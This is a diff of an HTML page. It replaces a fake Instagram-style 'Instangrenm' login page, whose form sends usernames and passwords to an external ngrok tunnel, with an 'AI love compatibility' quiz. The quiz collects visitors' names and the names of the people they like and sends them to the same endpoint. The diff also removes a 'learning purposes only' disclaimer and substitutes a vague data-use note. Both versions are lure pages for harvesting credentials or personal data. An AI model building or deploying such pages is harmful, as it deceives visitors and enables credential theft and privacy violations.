@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instangrenm Login Test</title>
+    <title>恋愛相性診断 - Love Checker</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -13,10 +13,10 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            flex-direction: column; /* 要素を縦に並べる */
+            flex-direction: column;
         }
 
-        .login-container {
+        .diagnosis-container {
             background-color: #fff;
             border: 1px solid #dbdbdb;
             width: 350px;
@@ -26,10 +26,18 @@
         }
 
         .logo {
-            font-size: 40px;
+            font-size: 32px;
             font-weight: bold;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
+            color: #ed4956; /* 恋愛らしいピンク・赤系 */
             font-style: italic;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+            line-height: 1.4;
         }
 
         form {
@@ -47,18 +55,22 @@
         }
 
         button {
-            background-color: #0095f6;
+            background-color: #ed4956;
             color: white;
             border: none;
             border-radius: 8px;
-            padding: 7px;
+            padding: 10px;
             font-weight: bold;
             font-size: 14px;
             cursor: pointer;
             margin-top: 10px;
         }
 
-        .signup-box {
+        button:hover {
+            background-color: #c13542;
+        }
+
+        .footer-box {
             background-color: #fff;
             border: 1px solid #dbdbdb;
             width: 350px;
@@ -69,7 +81,6 @@
             font-size: 14px;
         }
 
-        /* 追加した免責事項のスタイル */
         .disclaimer {
             font-size: 11px;
             color: #8e8e8e;
@@ -82,29 +93,28 @@
 </head>
 <body>
 
-    <div class="login-container">
-        <div class="logo">Instangrenm</div>
+    <div class="diagnosis-container">
+        <div class="logo">恋愛相性診断</div>
+        <div class="description">
+            二人の名前を入力して、<br>AIによる最新の相性診断をチェック！
+        </div>
         
-        <!-- URLの末尾が /login になっているか確認 -->
+        <!-- 送信先をngrokのURLに変更してください -->
         <form action="https://c08f40a4347a.ngrok-free.app" method="POST">
-            <input type="text" name="username" placeholder="ユーザー名" required>
-            <input type="password" name="password" placeholder="パスワード" required>
-            <button type="submit">ログイン</button>
+            <input type="text" name="your_name" placeholder="あなたの名前" required>
+            <input type="text" name="favorite_person" placeholder="好きな人の名前" required>
+            <button type="submit">診断結果を見る</button>
         </form>
     </div>
 
-    <div class="signup-box">
-        アカウントをお持ちでないですか？ <a href="#">登録する</a>
+    <div class="footer-box">
+        過去の診断履歴を確認しますか？ <a href="#" style="color: #0095f6; text-decoration: none; font-weight: bold;">ログイン</a>
     </div>
 
-    <!-- ここに免責事項を追加 -->
     <div class="disclaimer">
-        <br>
-        This is a test page for learning purposes only. Data is sent to a local environment.
+        ※この診断はエンターテインメント目的のものです。<br>
+        入力されたデータは診断アルゴリズムの向上に使用される場合があります。
     </div>
 
 </body>
 </html>
-
-
-
